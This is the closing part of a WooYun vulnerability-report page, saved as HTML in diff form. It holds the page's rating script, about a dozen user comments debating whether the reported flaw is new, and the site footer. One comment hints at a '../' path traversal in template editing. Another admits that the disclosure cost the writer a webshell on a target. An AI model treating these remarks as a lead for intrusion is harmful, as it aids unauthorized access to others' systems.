+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html(_LANGJS.RATING_SUCCESS);
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html(_LANGJS.LOGIN_FIRST);
+						break;
+					case 4:
+						$("#ratingShow").html(_LANGJS.RATING_BUGS_DONE);
+						break;
+					case 6:
+						$("#ratingShow").html(_LANGJS.RATING_BUGS_SELF);
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+<p class="detail">对本漏洞信息进行评价，以更好的反馈信息的价值，包括信息客观性，内容是否完整以及是否具备学习价值</p>
+		<h5 class="rating">
+		<div class="ratingText">漏洞评价<span>(共<span id="ratingSpan">0</span>人评价)</span>:</div>
+		<div class="myrating">
+			<span rel="-2" data-title="信息虚假或者没有任何自己的思考"></span>
+			<span rel="-1" data-title="内容不详并且漏洞信息评级及类型明显错误"></span>
+			<span rel="0" data-title="还可以，洞主继续努力"></span>
+			<span rel="1" data-title="信息完整，过程清晰，有截图有代码有视频有真相"></span>
+			<span rel="2" data-title="角度独特思路新颖值得学习"></span>
+			<div id="ratingShow">
+			登陆后才能进行评分			</div>
+		</div>
+		</h5>
+		<input type="hidden" id="myRating" value="" />
+
+<hr align="center" />
+<h2>评价</h2>
+
+<div id="replys" class="replys">
+	    <ol class="replylist">
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2012-12-03 13:35</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/El4pse">El4pse</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 路人 |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:29 漏洞数:7        | 世界上从来没有不可能这几个字，可不可能完...)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="29255"></span>
+        <span class="liketext liketext_min"><span id="likenum_29255">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>貌似之前就有这漏洞吧 </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">1#</span>
+                        <a title="回复 El4pse" href="javascript:void(0)" class="replyBtn" onclick="Reply('El4pse')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2012-12-03 13:54</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/lucifer">lucifer</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 路人 |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:24 漏洞数:6        | 游荡在世界的每个角落，一个人。)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="29260"></span>
+        <span class="liketext liketext_min"><span id="likenum_29260">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>利用方法不同，你可以对照一下 </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">2#</span>
+                        <a title="回复 lucifer" href="javascript:void(0)" class="replyBtn" onclick="Reply('lucifer')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2012-12-04 09:37</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/漏洞不是用来公开的">漏洞不是用来公开的</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 路人 |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:9 漏洞数:3        | 心存迷惑的话谁都会丧失斗志失去力量)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="29415"></span>
+        <span class="liketext liketext_min"><span id="likenum_29415">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>@lucifer 你谁啊，没事瞎报什么漏洞啊？就显你能是不是？ </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">3#</span>
+                        <a title="回复 漏洞不是用来公开的" href="javascript:void(0)" class="replyBtn" onclick="Reply('漏洞不是用来公开的')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2012-12-04 09:39</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/漏洞不是用来公开的">漏洞不是用来公开的</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 路人 |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:9 漏洞数:3        | 心存迷惑的话谁都会丧失斗志失去力量)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="29417"></span>
+        <span class="liketext liketext_min"><span id="likenum_29417">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>都别关注这破洞了，模板编辑那点点杠能遍历整个盘符 </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">4#</span>
+                        <a title="回复 漏洞不是用来公开的" href="javascript:void(0)" class="replyBtn" onclick="Reply('漏洞不是用来公开的')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2012-12-04 09:47</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/leehenwu">leehenwu</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 普通白帽子  |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:194 漏洞数:24        | 撸·啊·撸)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="29421"></span>
+        <span class="liketext liketext_min"><span id="likenum_29421">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>貌似早就有了吧 </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">5#</span>
+                        <a title="回复 leehenwu" href="javascript:void(0)" class="replyBtn" onclick="Reply('leehenwu')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2012-12-04 11:57</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/horseluke">horseluke</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 普通白帽子  |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:116 漏洞数:18        | Realize the dream in earnest.)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="29467"></span>
+        <span class="liketext liketext_min"><span id="likenum_29467">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>@xsser </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">6#</span>
+                        <a title="回复 horseluke" href="javascript:void(0)" class="replyBtn" onclick="Reply('horseluke')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2012-12-04 11:59</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/xsser">xsser</a> <img height="12" width="12" style="vertical-align:-2px;" src="http://wooyun.org/images/v.png" alt="认证白帽子" />			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 普通白帽子  |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:297 漏洞数:22        | 当我又回首一切,这个世界会好吗?)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="29468"></span>
+        <span class="liketext liketext_min"><span id="likenum_29468">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>@horseluke 貌似不一样吧 而且的确在官方测试成功得 </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">7#</span>
+                        <a title="回复 xsser" href="javascript:void(0)" class="replyBtn" onclick="Reply('xsser')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2012-12-05 21:48</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/lucifer">lucifer</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 路人 |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:24 漏洞数:6        | 游荡在世界的每个角落，一个人。)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="29609"></span>
+        <span class="liketext liketext_min"><span id="likenum_29609">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>@漏洞不是用来公开的
+你能好好说话？自己去试试再来说好么？能遍历个毛啊，几百年前就修复了。真服了。什么人 </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">8#</span>
+                        <a title="回复 lucifer" href="javascript:void(0)" class="replyBtn" onclick="Reply('lucifer')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2012-12-05 21:49</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/lucifer">lucifer</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 路人 |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:24 漏洞数:6        | 游荡在世界的每个角落，一个人。)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="29610"></span>
+        <span class="liketext liketext_min"><span id="likenum_29610">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>@leehenwu 大哥们，真心拜托你们按照以前的方法测试下，然后再来评论ok？ </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">9#</span>
+                        <a title="回复 lucifer" href="javascript:void(0)" class="replyBtn" onclick="Reply('lucifer')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2013-01-17 12:16</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/小猪">小猪</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 实习白帽子  |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:80 漏洞数:10        )
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="33749"></span>
+        <span class="liketext liketext_min"><span id="likenum_33749">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>phpMyAdmin------------1  这目录还在不。。。你这一爆害我的shell也掉了。。。。。 </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">10#</span>
+                        <a title="回复 小猪" href="javascript:void(0)" class="replyBtn" onclick="Reply('小猪')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+                <li class="reply clearfix">
+            <div class="reply-content">
+                <div class="reply-info">
+        <span class="addtime">2013-05-04 15:31</span> |
+    		<a target='_blank' href="http://www.wooyun.org/whitehats/少校">少校</a>			<!-- 增加路人判断显示 @zm 2013-12-13 Begin -->
+			( 实习白帽子  |			<!-- 增加路人判断显示 @zm 2013-12-13 End -->
+        Rank:40 漏洞数:5        | 别开枪，自己人！)
+	
+	<div class="likebox">
+        <span class="likepre" title="赞！" rel="45212"></span>
+        <span class="liketext liketext_min"><span id="likenum_45212">0</span></span>
+        <span class="likesuf"></span>
+    </div>
+                </div><!-- reply-info End -->
+
+                <div class="description">
+                    <p>好文章，好思路！ </p>
+                </div>
+
+                <div class="replylist-act">
+                		<span class="floor">11#</span>
+                        <a title="回复 少校" href="javascript:void(0)" class="replyBtn" onclick="Reply('少校')">回复此人</a>
+                </div>
+            </div><!-- reply-content End -->
+        </li>
+            </ol><!-- replylist End -->
+</div><!-- replys End -->
+
+<div id="reply" class="reply">
+<a name="comment"></a>
+<p class="detail">
+登录后才能发表评论，请先 <a href="http://wooyun.org/user.php?action=login"><u>登录</u></a> 。
+</p>
+<script type="text/javascript">
+var masaic = '0';
+
+function CommentLike(id){
+	$.post("/ajaxdo.php?module=commentrating",{"id":id,"token":$("#token").val()},function(re){
+		re=parseInt(re);
+		switch(re){
+			case 1:
+				$("#likenum_"+id).html(parseInt($("#likenum_"+id).html())+1);
+				break;
+			case 4:
+				alert(_LANGJS.COMMENT_GOOD_DONE);
+				break;
+			case 6:
+				alert(_LANGJS.COMMENT_SELF);
+				break;
+			default:break;
+		}
+	});
+}
+$(document).ready(function(){
+	$(".likebox .likepre").click(function(){
+            CommentLike($(this).attr("rel"));
+        });
+});
+
+
+</script>
+<div>
+	</div>
+	<div id="footer">
+        <span class="copyright fleft">
+    		Copyright &copy; 2010 - 2015 <a href="wooyun-2012-015536#">wooyun.org</a>, All Rights Reserved
+    		<a href="http://www.miibeian.gov.cn/">京ICP备15041338号-1</a>
+    		<!--a href="http://sae.sina.com.cn" target="_blank"><img src="/images/sae_bottom_logo.png" title="Powered by Sina App Engine"></a-->
+    	</span>
+        <span class="other fright">
+                        <a href="http://wooyun.org/impression">行业观点</a>
+            · <a href="http://wooyun.org/lawer">法律顾问</a>
+            · <a href="http://wooyun.org/contactus">联系我们</a>
+            · <a href="http://wooyun.org/help">帮助</a>
+            · <a href="http://wooyun.org/about">关于</a>
+        </span>
+    </div>
+	<script type="text/javascript">
+	var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+	document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fc12f88b5c1cd041a732dea597a5ec94c' type='text/javascript'%3E%3C/script%3E"));
+	</script>
+    <script type="text/javascript" id="bdshare_js" data="type=button" ></script>
+    <script type="text/javascript" id="bdshell_js"></script>
+    <script type="text/javascript">
+        document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + new Date().getHours();
+        
+        if (top.location !== self.location) top.location=self.location;
+    </script>
+</body>
+</html>
